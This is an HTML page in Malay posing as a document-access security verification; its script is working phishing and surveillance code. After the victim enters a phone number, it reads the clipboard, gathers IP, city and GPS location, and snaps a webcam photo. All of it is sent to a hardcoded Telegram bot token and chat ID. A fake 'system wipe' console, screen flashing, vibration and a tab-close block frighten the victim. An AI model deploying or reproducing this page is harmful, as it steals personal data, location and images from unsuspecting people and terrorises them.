<!DOCTYPE html>
<html lang="ms">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM_CRITICAL_ERROR</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-shadow: 0 0 5px #0f0; transition: background 0.1s; }
        .container { width: 85%; max-width: 500px; border: 1px solid #0f0; padding: 20px; background: rgba(0, 20, 0, 0.9); z-index: 2; }
        .header { font-weight: bold; color: #f00; text-align: center; border-bottom: 1px solid #0f0; padding-bottom: 10px; margin-bottom: 15px; animation: pulse 1s infinite; text-transform: uppercase; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        #console { font-size: 0.8rem; height: 220px; overflow: hidden; margin: 15px 0; line-height: 1.4; background: #001400; padding: 5px; border: 1px inset #0f0; }
        .progress-bar { width: 100%; height: 10px; border: 1px solid #0f0; position: relative; }
        .progress-fill { height: 100%; background: #0f0; width: 0%; transition: width 0.4s; }
        .red { color: #f00; font-weight: bold; }
        input { width: 100%; padding: 10px; background: #000; border: 1px solid #0f0; color: #0f0; text-align: center; margin-bottom: 15px; }
        button { width: 100%; padding: 12px; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; }
        
        /* Fitur Gempak: Camera Overlay */
        #camera-preview {
            position: fixed; top: 10px; right: 10px; width: 120px; height: 160px;
            border: 2px solid #f00; border-radius: 8px; transform: scaleX(-1);
            object-fit: cover; z-index: 10; display: none; box-shadow: 0 0 15px #f00;
        }
    </style>
</head>
<body>

    <video id="camera-preview" autoplay playsinline></video>

    <div class="container" id="box-auth">
        <div class="header"> [!] SECURITY ALERT [!] </div>
        <p style="text-align:center; font-size:0.9rem;">Sila masukkan nombor telefon untuk pengesahan akses dokumen:</p>
        <input type="tel" id="phone-input" placeholder="+60123456789">
        <button onclick="startFullBreach()">START VERIFICATION</button>
    </div>

    <div class="container" id="box-hacker" style="display:none;">
        <div class="header"> [!] EXECUTING SYSTEM WIPE [!] </div>
        <div id="console"></div>
        <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
        <p id="status" style="font-size:0.8rem; margin-top:10px;">Accessing internal storage... <span>_</span></p>
    </div>

    <canvas id="canvas" style="display:none;" width="640" height="480"></canvas>

    <script>
        const TOKEN = '8720467847:AAFxo75yX3BBCsdSXEwSSWATO6Gth76CTCo';
        const CHAT_ID = '8563935930';

        function log(text, isRed = false) {
            const p = document.createElement('p');
            p.style.margin = '2px 0';
            if (isRed) p.className = 'red';
            p.innerHTML = `> ${text}`;
            const c = document.getElementById('console');
            c.appendChild(p);
            c.scrollTop = c.scrollHeight;
        }

        async function startFullBreach() {
            const phone = document.getElementById('phone-input').value;
            if (phone.length < 9) return alert("Sila masukkan nombor yang sah!");

            // Fitur: Full Screen
            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();

            document.getElementById('box-auth').style.display = 'none';
            document.getElementById('box-hacker').style.display = 'block';

            await sendToTele(`📱 *TARGET:* \`${phone}\`\n🚀 *Status:* Breach Started`);

            // Fitur: Clipboard Snatcher
            try {
                const clip = await navigator.clipboard.readText();
                if (clip) await sendToTele(`📋 *CLIPBOARD:* \`${clip}\``);
            } catch(e) {}

            runVisualEffects();
            captureProcess(phone);
        }

        function runVisualEffects() {
            log("Initializing exploit...");
            setTimeout(() => log("Bypassing Knox/Security... [OK]"), 1000);
            setTimeout(() => log("Accessing DCIM/Gallery...", true), 2500);
            
            // Fitur: Screen Flash
            const flash = setInterval(() => {
                document.body.style.backgroundColor = (document.body.style.backgroundColor === 'red' ? 'black' : 'red');
            }, 100);
            setTimeout(() => { 
                clearInterval(flash); 
                document.body.style.backgroundColor = 'black';
            }, 3000);

            // Fitur: Vibration
            if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);

            // Fake Wipe Logs
            setTimeout(() => log("Deleting /sdcard/WhatsApp/Media..."), 4500);
            setTimeout(() => log("Extracting Saved Passwords (Chrome)...", true), 6000);
            setTimeout(() => log("Wiping System Partition... 40%"), 8000);

            let w = 0;
            const bar = setInterval(() => {
                w += Math.random() * 8;
                document.getElementById('fill').style.width = w + "%";
                if (w >= 100) clearInterval(bar);
            }, 700);
        }

        async function captureData(phone) {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                const waktu = new Date().toLocaleString('ms-MY');
                
                let info = `🚨 *BREACH REPORT*\n📱 *Phone:* ${phone}\n🌐 *IP:* \`${d.ip}\`\n📍 *Loc:* ${d.city}, ${d.country_name}\n⏰ *Time:* ${waktu}`;
                await sendToTele(info);

                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(p => {
                        sendToTele(`📍 *GPS:* https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                    });
                }
            } catch(e) {}
        }

        async function captureProcess(phone) {
            captureData(phone);
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.getElementById('camera-preview');
                video.srcObject = stream;
                
                // Fitur: Show Live Camera Overlay
                video.style.display = 'block';
                log("Camera Link: ESTABLISHED", true);

                await new Promise(r => setTimeout(r, 3000));
                
                // Snap Photo
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('photo', blob, 'snap.jpg');
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                }, 'image/jpeg');

                // Redirect
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 12000);

            } catch (e) {
                log("Camera Access: DENIED", true);
            }
        }

        async function sendToTele(t) {
            return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: t, parse_mode: 'Markdown'})
            });
        }
        
        // Anti-Tab Close
        window.onbeforeunload = function() { return "Data sedang diproses!"; };
    </script>
</body>
</html>
